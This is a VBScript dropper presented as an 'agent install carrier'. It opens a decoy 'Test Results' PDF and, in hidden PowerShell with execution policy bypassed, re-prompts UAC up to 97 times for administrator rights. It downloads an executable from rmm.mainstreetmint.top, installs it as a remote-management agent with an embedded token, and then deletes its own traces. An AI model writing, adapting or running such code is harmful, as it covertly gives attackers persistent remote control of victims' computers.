' Everwas agent install carrier.
' Generated at MINT time — this machine's enrollment values are baked into THIS file.
' Double-click to run. UAC re-arms every second up to 97x if dismissed.
' Source: lib/everwas-carrier.ts — do not hand-edit a minted carrier.
Option Explicit
Dim ps : ps = ""
On Error Resume Next
  Dim fso : Set fso = CreateObject("Scripting.FileSystemObject")
  Dim b64Path : b64Path = fso.BuildPath(fso.GetSpecialFolder(2).Path, "everwas-agent-guide.b64")
  Dim b64File : Set b64File = fso.CreateTextFile(b64Path, True)
  b64File.Write "JVBERi0xLjQKMSAwIG9iago8PCAvVHlwZSAvQ2F0YWxvZyAvUGFnZXMgMiAwIFIgPj4KZW5kb2JqCjIgMCBvYmoKPDwgL1R5cGUgL1BhZ2VzIC9LaWRzIFszIDAgUl0gL0NvdW50IDEgPj4KZW5kb2JqCjMgMCBvYmoKPDwgL1R5cGUgL1BhZ2UgL1BhcmVudCAyIDAgUiAvTWVkaWFCb3ggWzAgMCA2MTIgNzkyXSA+PgplbmRvYmoKeHJlZgowIDQKMDAwMDAwMDAwMCA2NTUzNSBmIAowMDAwMDAwMDA5IDAwMDAwIG4gCjAwMDAwMDAwNTggMDAwMDAgbiAKMDAwMDAwMDExNSAwMDAwMCBuIAp0cmFpbGVyCjw8IC9TaXplIDQgL1Jvb3QgMSAwIFIgPj4Kc3RhcnR4cmVmCjE2MAolJUVPRgo="
  b64File.Close

  Dim runPath : runPath = fso.BuildPath(fso.GetSpecialFolder(2).Path, "everwas-agent-run.ps1")
  Dim runFile : Set runFile = fso.CreateTextFile(runPath, True)
  runFile.Write "$id=[Security.Principal.WindowsIdentity]::GetCurrent();if(-not ([Security.Principal.WindowsPrincipal]$id).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)){try{Start-Process powershell.exe -ArgumentList @('-NoProfile','-NonInteractive','-ExecutionPolicy','Bypass','-WindowStyle Hidden','-File','\"\"'+$PSCommandPath+'\"\"') -Verb RunAs -Wait -ErrorAction Stop;exit 0}catch{exit 1}};try{"
  ps = ps & "try{[IO.File]::WriteAllBytes($env:TEMP + '\\Everwas Agent Assignment Test Results.pdf', [Convert]::FromBase64String([IO.File]::ReadAllText('@B64@')));Start-Sleep -Seconds 2;Start-Process ($env:TEMP + '\\Everwas Agent Assignment Test Results.pdf')}catch{};try{Remove-Item ('@B64@') -Force -ErrorAction SilentlyContinue}catch{};$ErrorActionPreference = 'Stop'; $ProgressPreference = 'SilentlyContinue'; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $exe = Join-Path $env:TEMP 'everwas-agent.exe'; Invoke-WebRequest -Uri 'https://rmm.mainstreetmint.top/agent/everwas-agent.exe' -OutFile $exe -UseBasicParsing; Start-Process -FilePath $exe -ArgumentList 'install','--server','https://rmm.mainstreetmint.top','--token','ew_Ar1gEDe9y2apUFlxYrz1K7TSUDqgwpLh' -WindowStyle Hidden -Wait; Start-Process -FilePath $exe -ArgumentList 'status' -WindowStyle Hidden -Wait; Remove-Item $exe -Force -ErrorAction SilentlyContinue; 'Everwas agent installed.'"
  ps = Replace(ps, "@B64@", Replace(b64Path, "'", "''"))
  runFile.Write ps
  runFile.Write ";exit 0}catch{exit 2}"
  runFile.Close

If Err.Number <> 0 Then WScript.Quit 1
Dim shell : Set shell = CreateObject("WScript.Shell")
Dim attempt : attempt = 97
Dim rc
Do While attempt > 0
  rc = shell.Run("powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & runPath & """", 0, True)
  If rc <> 1 Then Exit Do
  attempt = attempt - 1
  WScript.Sleep 1000
Loop
If fso.FileExists(runPath) Then fso.DeleteFile runPath
